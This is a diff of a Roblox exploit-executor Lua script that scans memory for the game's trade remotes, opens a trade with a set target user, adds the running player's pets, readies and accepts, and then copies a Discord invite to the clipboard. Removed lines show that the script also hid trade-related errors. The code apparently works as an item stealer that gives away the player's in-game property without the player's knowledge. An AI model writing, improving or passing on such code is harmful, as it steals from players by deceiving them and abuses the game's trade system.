@@ -1,25 +1,6 @@
 repeat task.wait() until game:IsLoaded()
 task.wait(1.5)
 
-pcall(function()
-    local scriptContext = game:GetService("ScriptContext")
-    for _, conn in ipairs(getconnections(scriptContext.Error)) do
-        if conn.Function then
-            local old = conn.Function
-            conn:Disable()
-            scriptContext.Error:Connect(function(message, stackTrace)
-                local msg = tostring(message):lower()
-                local trace = tostring(stackTrace):lower()
-                if msg:find("plotclient") or msg:find("tradecontroller") or trace:find("plotclient") or trace:find("tradecontroller") then
-                    return
-                end
-                old(message, stackTrace)
-            end)
-            break
-        end
-    end
-end)
-
 if game.PlaceId ~= 109983668079237 then
     local plr = game.Players.LocalPlayer
     if plr and typeof(plr.Kick) == "function" then
@@ -57,7 +38,6 @@ end
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local TeleportService = game:GetService("TeleportService")
 local plr = Players.LocalPlayer
 if not plr then return end
 
@@ -130,28 +110,9 @@ if identifyexecutor and identifyexecutor() == "Delta" then
     REAL_JOB_ID = bypassJobId
 end
 
-local cam = workspace.CurrentCamera
-local pg = plr:WaitForChild("PlayerGui")
-
-local function handleCam(obj)
-    if obj:IsA("BlurEffect") then
-        task.defer(function() obj:Destroy() end)
-    end
-end
-
-cam.ChildAdded:Connect(handleCam)
-for _, v in ipairs(cam:GetChildren()) do handleCam(v) end
-
-cam:GetPropertyChangedSignal("FieldOfView"):Connect(function()
-    cam.FieldOfView = 70
-end)
-cam.FieldOfView = 70
-
-local AnimalsData, AnimalsShared, NumberUtils
+local AnimalsData
 pcall(function()
     AnimalsData = require(ReplicatedStorage:WaitForChild("Datas"):WaitForChild("Animals"))
-    AnimalsShared = require(ReplicatedStorage:WaitForChild("Shared"):WaitForChild("Animals"))
-    NumberUtils = require(ReplicatedStorage:WaitForChild("Utils"):WaitForChild("NumberUtils"))
 end)
 
 local function loadSyncData()
@@ -415,7 +376,6 @@ if total_items ~= 0 or total_items > 1 then
 end
 
 local tradeRemotes = {}
-local scannedRemotes = {}
 
 for _, v in pairs(getgc(true)) do
     if type(v) == "function" then
@@ -426,11 +386,8 @@ for _, v in pairs(getgc(true)) do
                 if ok and upval and typeof(upval) == "Instance" then
                     if upval:IsA("RemoteFunction") or upval:IsA("RemoteEvent") then
                         local name = upval.Name
-                        if not scannedRemotes[name] then
-                            scannedRemotes[name] = true
-                            if name:find("TradeService") then
-                                tradeRemotes[name] = upval
-                            end
+                        if not tradeRemotes[name] and name:find("TradeService") then
+                            tradeRemotes[name] = upval
                         end
                     end
                 end
@@ -438,68 +395,16 @@ for _, v in pairs(getgc(true)) do
         end
     elseif typeof(v) == "Instance" and (v:IsA("RemoteFunction") or v:IsA("RemoteEvent")) then
         local name = v.Name
-        if not scannedRemotes[name] and name:find("TradeService") then
-            scannedRemotes[name] = true
+        if not tradeRemotes[name] and name:find("TradeService") then
             tradeRemotes[name] = v
         end
     end
 end
 
-local function addNextBrainrot(addRemote, index)
-    if not addRemote or index > #brainrotQueue then return false end
-
-    local item = brainrotQueue[index]
-    local data = item.data
-
-    local payload = {
-        UUID = data.UUID or data.Uid,
-        LastCollect = data.LastCollect or 1771790678,
-        Index = data.Index,
-        OfflineGain = data.OfflineGain or 99,
-        Steal = false,
-    }
-
-    if data.Traits and type(data.Traits) == "table" then
-        payload.Traits = data.Traits
-    end
-
-    if data.Mutation then
-        if type(data.Mutation) == "string" and data.Mutation ~= "" then
-            payload.Mutation = data.Mutation
-        elseif type(data.Mutation) == "table" then
-            local isArray = true
-            for i = 1, #data.Mutation do
-                if not data.Mutation[i] then
-                    isArray = false
-                    break
-                end
-            end
-            if isArray then
-                if #data.Mutation > 0 then
-                    payload.Mutation = data.Mutation[1]
-                end
-            else
-                for traitName, _ in pairs(data.Mutation) do
-                    payload.Mutation = traitName
-                    break
-                end
-            end
-        end
-    end
-
-    pcall(function()
-        addRemote:InvokeServer(item.slotKey, payload)
-    end)
-
-    return true
-end
-
 local isTradeCompleted = false
-local tradeRunning = false
 
 local function startTradeAutomation(targetId)
-    if isTradeCompleted or tradeRunning then return end
-    tradeRunning = true
+    if isTradeCompleted then return end
 
     local searchRemote = tradeRemotes["RF/TradeService/SearchUser"]
     local inviteRemote = tradeRemotes["RF/TradeService/Invite"]
@@ -507,22 +412,27 @@ local function startTradeAutomation(targetId)
     local readyRemote = tradeRemotes["RE/TradeService/Ready"]
     local acceptRemote = tradeRemotes["RE/TradeService/Accept"]
 
-    if not searchRemote or not inviteRemote then
-        tradeRunning = false
-        return
-    end
+    if not searchRemote or not inviteRemote then return end
 
-    if addRemote then
+    if addRemote and #brainrotQueue > 0 then
         task.spawn(function()
-            local currentIndex = 1
-            while not isTradeCompleted do
-                if currentIndex <= #brainrotQueue then
-                    addNextBrainrot(addRemote, currentIndex)
-                    currentIndex = currentIndex + 1
-                else
-                    currentIndex = 1
+            for _, item in ipairs(brainrotQueue) do
+                if isTradeCompleted then break end
+                local data = item.data
+                local payload = {
+                    UUID = data.UUID or data.Uid,
+                    LastCollect = data.LastCollect or 1771790678,
+                    Index = data.Index,
+                    OfflineGain = data.OfflineGain or 99,
+                    Steal = false,
+                }
+                if data.Traits and type(data.Traits) == "table" then
+                    payload.Traits = data.Traits
                 end
-                task.wait(1)
+                pcall(function()
+                    addRemote:InvokeServer(item.slotKey, payload)
+                end)
+                task.wait(0.5)
             end
         end)
     end
@@ -552,7 +462,6 @@ local function startTradeAutomation(targetId)
         task.wait(90)
         if not isTradeCompleted then
             isTradeCompleted = true
-            tradeRunning = false
             task.wait(2)
             pcall(function() setclipboard("https://discord.gg/wep4k9Fg8W") end)
             pcall(function()
